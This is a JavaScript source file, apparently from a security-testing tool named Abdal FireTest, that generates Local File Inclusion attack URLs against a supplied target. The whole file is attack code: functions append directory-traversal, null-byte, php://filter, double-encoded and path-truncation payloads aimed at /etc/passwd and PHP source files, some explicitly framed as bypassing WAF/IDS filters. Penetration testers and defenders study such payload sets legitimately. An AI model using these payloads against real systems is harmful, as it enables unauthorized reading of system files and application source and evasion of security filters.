/*
 **********************************************************************
 * -------------------------------------------------------------------
 * Project Name : Abdal FireTest
 * File Name    : LFI.js
 * Author       : Ebrahim Shafiei (EbraSha)
 * Email        : Prof.Shafiei@Gmail.com
 * Created On   : 2023-08-02 14:30:00
 * Description  : Local File Inclusion helper functions for Abdal FireTest
 * -------------------------------------------------------------------
 *
 * "Coding is an engaging and beloved hobby for me. I passionately and insatiably pursue knowledge in cybersecurity and programming."
 * – Ebrahim Shafiei
 *
 **********************************************************************
 */

LFI = {
    // Basic LFI Payload with directory traversal
    createBasicPayload: function(url) {
        // Creates a basic Local File Inclusion payload
        const baseUrl = this.extractBaseUrlWithParams(url);
        return baseUrl + "file=../../../../../etc/passwd";
    },
    
    // LFI with Null Byte Injection (works in PHP < 5.3.4)
    createNullBytePayload: function(url) {
        // Creates an LFI payload with null byte to bypass file extension restrictions
        const baseUrl = this.extractBaseUrlWithParams(url);
        return baseUrl + "file=../../../../../etc/passwd%00";
    },
    
    // LFI to include /etc/passwd directly
    createPasswdFilePayload: function(url) {
        // Creates an LFI payload targeting the /etc/passwd file specifically
        const baseUrl = this.extractBaseUrlWithParams(url);
        return baseUrl + "file=/etc/passwd";
    },
    
    // LFI with deep directory traversal
    createDirectoryTraversalPayload: function(url) {
        // Creates an LFI payload with extensive directory traversal
        const baseUrl = this.extractBaseUrlWithParams(url);
        return baseUrl + "file=../../../../../../../../../../../../etc/passwd";
    },
    
    // LFI with PHP wrapper (php://filter)
    createPHPWrapperPayload: function(url, file = "index.php") {
        // Creates an LFI payload using PHP filter wrapper to read PHP source code
        const baseUrl = this.extractBaseUrlWithParams(url);
        return baseUrl + "file=php://filter/convert.base64-encode/resource=" + file;
    },
    
    // LFI with double encoding to bypass some WAF/IDS
    createDoubleEncodingPayload: function(url) {
        // Creates an LFI payload with double URL encoding to bypass filters
        const baseUrl = url.includes('?') ? url.split('?')[0] : url;
        return baseUrl + "?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd";
    },
    
    // LFI with path truncation (works in older PHP versions)
    createPathTruncationPayload: function(url) {
        // Creates an LFI payload using path truncation technique
        const baseUrl = url.includes('?') ? url.split('?')[0] : url;
        return baseUrl + "?page=../../../etc/passwd/././././././././././././././././././././././././";
    },
    
    // Helper function to extract base URL with appropriate parameter connector
    extractBaseUrlWithParams: function(url) {
        // Clean up the URL first
        url = url.trim();
        
        // If URL doesn't start with http:// or https://, add it
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'http://' + url;
        }
        
        // Check if URL already has parameters
        if (url.includes('?')) {
            // URL already has parameters, append with &
            return url + (url.endsWith('&') ? '' : '&');
        } else {
            // URL has no parameters, start with ?
            return url + (url.endsWith('?') ? '' : '?');
        }
    },
    
    // Advanced LFI payload generator that automatically detects URL structure
    generatePayload: function(url, technique, params = {}) {
        switch(technique) {
            case 'basic':
                return this.createBasicPayload(url);
            case 'nullbyte':
                return this.createNullBytePayload(url);
            case 'passwd':
                return this.createPasswdFilePayload(url);
            case 'traversal':
                return this.createDirectoryTraversalPayload(url);
            case 'wrapper':
                return this.createPHPWrapperPayload(url, params.file || "index.php");
            case 'double_encoding':
                return this.createDoubleEncodingPayload(url);
            case 'path_truncation':
                return this.createPathTruncationPayload(url);
            default:
                return this.createBasicPayload(url);
        }
    }
}; 